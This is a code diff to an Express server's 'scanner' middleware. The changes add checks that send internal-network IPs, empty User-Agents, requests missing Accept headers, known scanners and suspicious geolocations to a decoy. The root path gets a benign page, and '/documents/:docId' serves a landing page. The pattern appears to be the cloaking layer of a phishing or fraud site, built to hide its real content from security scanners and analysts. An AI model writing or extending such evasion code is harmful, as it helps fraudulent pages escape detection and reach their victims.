@@ -176,12 +176,7 @@ function isObviousScanner(req) {
     'msie 6.0', 'msie 7.0', 'msie 8.0', 'netscape',
     'mosaic', 'opera mini', 'uc browser', 'silk browser'
   ];
-  
-  // Also check for missing/empty User-Agent
-  if (!ua || ua.length < 10) {
-    return true;
-  }
-  
+
   // Check for suspicious patterns
   const suspiciousPatterns = [
     /bot\//i,
@@ -237,19 +232,34 @@ function scannerMiddleware(req, res, next) {
   const ua = req.get('User-Agent') || '';
   const currentPath = req.path;
   console.log(`🎯 SCANNER MIDDLEWARE EXECUTING for: ${req.method} ${req.path}`);
-  // log('info', { event: 'request', ip: clientIp, ua: ua.slice(0, 200), path: currentPath });
+  log('info', { event: 'request', ip: clientIp, ua: ua.slice(0, 200), path: currentPath });
 
   if (currentPath.match(/\.(css|js|png|jpg|ico|svg)$/i) || currentPath === '/health') return next();
+
+  // 2. Block internal IPs (fast check)
+  const internalIPs = ['10.', '192.168.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', 
+                       '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.',
+                       '172.28.', '172.29.', '172.30.', '172.31.', '::1', '::ffff:127.0.0.1'];
+  
+  if (internalIPs.some(ip => clientIp.startsWith(ip))) {
+    log('warn', { event: 'internal_scan_blocked', ip: clientIp });
+    return serveDecoy(res);
+  }
+
+  // 3. Block empty User-Agents directly (fast check)
+  if (!ua || ua.trim() === '') {
+    log('warn', { event: 'empty_ua_blocked', ip: clientIp });
+    return serveDecoy(res);
+  }
+  
+   if (!req.get('Accept') || !req.get('Accept-Language')) {
+    log('warn', { event: 'missing_headers', ip: clientIp, ua: ua.slice(0, 200) });
+    return serveDecoy(res);
+  }
 
   if (isObviousScanner(req)) {
     log('warn', { event: 'obvious_scanner', ip: clientIp, ua: ua.slice(0, 200) });
     return serveDecoy(res); // ⬅️ immediately respond, no limiter delay
-  }
-
-
-  if (!req.get('Accept') || !req.get('Accept-Language')) {
-    log('warn', { event: 'missing_headers', ip: clientIp, ua: ua.slice(0, 200) });
-    return serveDecoy(res);
   }
 
   if (isSuspiciousGeoLocation(req)) {
@@ -300,6 +310,11 @@ function isTooFast(req) {
 app.use(scannerMiddleware);
 
 // ======= Routes =======
+app.get('/', (req, res) => {
+  log('warn', { event: 'root_scan', ip: req.clientIp });
+  return serveBenignPage(res); // Show generic error page
+});
+
 app.get('/documents/:docId',(req, res) => {
   const docId = sanitizeInput(req.params.docId);
   log('info', { event: 'serve_landing', ip: req.clientIp, docId });
